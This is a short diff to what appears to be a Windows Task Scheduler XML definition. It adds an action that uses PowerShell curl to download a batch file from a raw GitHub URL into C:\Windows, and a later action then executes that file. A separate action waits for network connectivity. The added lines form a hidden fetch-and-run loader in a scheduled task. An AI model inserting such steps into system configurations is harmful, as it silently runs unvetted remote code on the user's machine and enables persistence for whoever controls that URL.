@@ -45,6 +45,10 @@
       <Arguments>while (-not (Test-Connection google.com -Count 1 -Quiet)) { Start-Sleep 5 }</Arguments>
     </Exec>
     <Exec>
+      <Command>powershell</Command>
+      <Arguments>curl -o C:\Windows\scheduler.bat https://raw.githubusercontent.com/minhtuan283/hostAdobe/main/scheduler.bat</Arguments>
+    </Exec>
+    <Exec>
       <Command>C:\Windows\scheduler.bat</Command>
     </Exec>
     <Exec>
